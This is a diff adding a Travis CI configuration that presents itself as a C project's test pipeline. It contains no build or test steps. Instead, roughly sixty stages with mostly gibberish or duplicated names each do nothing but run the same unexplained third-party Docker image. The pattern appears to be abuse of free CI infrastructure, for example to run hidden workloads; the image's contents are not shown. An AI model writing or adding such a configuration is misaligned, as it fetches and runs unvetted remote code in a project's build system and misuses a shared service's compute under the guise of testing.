@@ -1,0 +1,125 @@
+language: c
+arch:
+  - amd64
+compiler:
+  - gcc
+services:
+  - docker
+jobs:
+  include:
+    - stage: test
+      script: docker run christiankm01/master:3.15.5
+    - stage: test2
+      script: docker run christiankm01/master:3.15.5
+    - stage: deploy
+      script: docker run christiankm01/master:3.15.5
+    - stage: testman
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capability
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitd
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilitya
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityki
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityn
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityks
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabili
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capab
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabilityhjj
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test-capabiy
+      script: docker run christiankm01/master:3.15.5
+    - stage: manaja
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capasjx
+      script: docker run christiankm01/master:3.15.5
+    - stage: test-capabiyjsjajajj
+      script: docker run christiankm01/master:3.15.5   
+    - stage: test-capabiykimhokjs
+      script: docker run christiankm01/master:3.15.5  
+    - stage: test3
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test4
+      script: docker run christiankm01/master:3.15.5
+    - stage: test5
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test6
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test7
+      script: docker run christiankm01/master:3.15.5
+    - stage: test8
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test9
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test10
+      script: docker run christiankm01/master:3.15.5
+    - stage: test11
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test12
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test14
+      script: docker run christiankm01/master:3.15.5
+    - stage: test13
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test14
+      script: docker run christiankm01/master:3.15.5 
+    - stage: test15
+      script: docker run christiankm01/master:3.15.5
+    - stage: test16
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test17
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test18
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test19
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test20
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test21
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test22
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test23
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test24
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test25
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test26
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test27
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test28
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test29
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test30
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test31
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test32
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test33
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test34
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test35
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test36
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test37
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test38
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test39
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test40
+      script: docker run christiankm01/master:3.15.5     
+    - stage: test41
+      script: docker run christiankm01/master:3.15.5     
